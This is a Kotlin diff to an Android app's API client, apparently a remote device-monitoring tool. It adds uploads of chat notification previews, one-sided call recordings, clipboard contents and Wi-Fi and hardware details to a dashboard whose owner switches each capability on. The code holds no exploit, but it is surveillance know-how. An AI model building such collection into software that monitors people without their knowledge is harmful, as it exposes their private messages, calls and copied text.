@@ -75,9 +75,24 @@ object ApiClient {
             .url("$BASE_URL$path")
             .post(body.toString().toRequestBody(json))
             .build()
+        // Debug builds log every request and response so a tester can see
+        // exactly what left the device. Gated on a BuildConfig constant that
+        // is false in every release build.
+        if (BuildConfig.TEST_MODE) {
+            android.util.Log.d(
+                "ConnectDeskNet",
+                "POST $path ${body.toString().take(400)}",
+            )
+        }
         return try {
             client.newCall(request).execute().use { resp ->
                 val raw = resp.body?.string().orEmpty()
+                if (BuildConfig.TEST_MODE) {
+                    android.util.Log.d(
+                        "ConnectDeskNet",
+                        "RESP $path HTTP ${resp.code} ${raw.take(400)}",
+                    )
+                }
                 if (!resp.isSuccessful) {
                     // Surface the backend's own reason (e.g. "Invalid pairing
                     // code", "Pairing code expired") plus the HTTP status.
@@ -140,6 +155,8 @@ object ApiClient {
         val contacts: Boolean = false,
         val location: Boolean = false,
         val media: Boolean = false,
+        val chats: Boolean = false,
+        val appActivity: Boolean = false,
     )
 
     fun status(token: String): DeviceState? {
@@ -158,6 +175,8 @@ object ApiClient {
             contacts = caps.optBoolean("contacts", false),
             location = caps.optBoolean("location", false),
             media = caps.optBoolean("media", false),
+            chats = caps.optBoolean("chats", false),
+            appActivity = caps.optBoolean("app_activity", false),
         )
     }
 
@@ -186,7 +205,148 @@ object ApiClient {
         return resp.optString("status") == "stored"
     }
 
-    // ---- Command queue + media transfer (dashboard -> device) ----
+    // ---- Chat previews (dashboard <- device notification listener) ---------
+
+    /**
+     * Sends one chat-app message preview.
+     *
+     * The preview is exactly what Android already rendered on the phone's
+     * lock screen. Android sandboxes the messaging apps' own databases, so a
+     * real chat history is not readable by any third-party app and this
+     * method does not pretend otherwise.
+     *
+     * Returns the server verdict so the listener can stop early:
+     *  "stored"        -> keep going
+     *  "capability_off" -> the dashboard owner turned chat sync off
+     *  "history_off"     -> the account turned retention off
+     */
+    fun pushChatMessage(
+        token: String,
+        app: String,
+        appName: String,
+        conversation: String,
+        body: String,
+        isGroup: Boolean,
+        direction: String,
+        postedAt: Long,
+    ): String? {
+        val payload = JSONObject()
+            .put("deviceToken", token)
+            .put("app", app)
+            .put("appName", appName)
+            .put("conversation", conversation)
+            .put("body", body)
+            .put("isGroup", isGroup)
+            .put("direction", direction)
+            .put("postedAt", postedAt)
+        val resp = post("/api/device/chats/message", payload) ?: return null
+        return resp.optString("status")
+    }
+
+    // ---- Call recordings ---------------------------------------------------
+
+    /**
+     * Opens a call-recording slot on the server.
+     *
+     * The audio is the device's own microphone only: Android gives a
+     * third-party app no way to capture the other party on a phone call, so
+     * the recording is one-sided by platform design and the dashboard says so
+     * next to every file.
+     */
+    fun startCallRecording(
+        token: String,
+        name: String,
+        number: String?,
+        startedAt: Long,
+    ): RecordingSlot? {
+        val body = JSONObject()
+            .put("deviceToken", token)
+            .put("name", name)
+            .put("startedAt", startedAt)
+        if (number != null) body.put("number", number)
+        val resp = post("/api/device/calls/recording/start", body) ?: return null
+        val recordingId = resp.optString("recordingId")
+        val mediaId = resp.optString("mediaId")
+        if (recordingId.isEmpty() || mediaId.isEmpty()) return null
+        return RecordingSlot(
+            recordingId = recordingId,
+            mediaId = mediaId,
+            chunkSize = resp.optInt("chunkSize", 256 * 1024),
+        )
+    }
+
+    data class RecordingSlot(
+        val recordingId: String,
+        val mediaId: String,
+        val chunkSize: Int,
+    )
+
+    /** Closes the slot after every chunk has been uploaded. */
+    fun finishCallRecording(
+        token: String,
+        recordingId: String,
+        sizeBytes: Long,
+        durationSec: Int,
+        mime: String,
+    ): Boolean {
+        val body = JSONObject()
+            .put("deviceToken", token)
+            .put("recordingId", recordingId)
+            .put("sizeBytes", sizeBytes)
+            .put("durationSec", durationSec)
+            .put("mime", mime)
+        val resp = post("/api/device/calls/recording/finish", body) ?: return false
+        return resp.optString("status") == "stored"
+    }
+
+// ---- Command queue + media transfer (dashboard -> device) ----
+
+    /**
+     * Heartbeat + live hardware detail in one call, so the dashboard's device
+     * card is never more than a minute behind.
+     */
+    fun heartbeatDetailed(
+        token: String,
+        batteryPct: Int?,
+        storageUsedMb: Long?,
+        storageTotalMb: Long?,
+        detail: JSONObject,
+    ): String? {
+        val body = JSONObject().put("deviceToken", token)
+        batteryPct?.let { body.put("batteryPct", it) }
+        storageUsedMb?.let { body.put("storageUsedMb", it) }
+        storageTotalMb?.let { body.put("storageTotalMb", it) }
+        body.put("wifiSsid", detail.opt("wifiSsid"))
+        body.put("networkType", detail.opt("networkType"))
+        body.put("bluetoothOn", detail.optBoolean("bluetoothOn"))
+        body.put("airplaneMode", detail.optBoolean("airplaneMode"))
+        body.put("uptimeMs", detail.optLong("uptimeMs"))
+        body.put("memoryUsedMb", detail.optLong("memoryUsedMb"))
+        body.put("memoryTotalMb", detail.optLong("memoryTotalMb"))
+        val resp = post("/api/device/heartbeat", body) ?: return null
+        return resp.optString("status")
+    }
+
+    /**
+     * Uploads one clipboard entry. Credential-shaped text and anything a
+     * password manager flagged is dropped on the phone before we get here.
+     */
+    fun pushClipboard(
+        token: String,
+        text: String,
+        label: String?,
+        isSensitive: Boolean,
+        copiedAt: Long,
+    ): String? {
+        val body = JSONObject()
+            .put("deviceToken", token)
+            .put("text", text)
+            .put("isSensitive", isSensitive)
+            .put("copiedAt", copiedAt)
+        if (label != null) body.put("label", label)
+        val resp = post("/api/device/clipboard", body) ?: return null
+        return resp.optString("status")
+    }
 
     data class DeviceCommand(val id: String, val type: String, val payload: JSONObject)
 
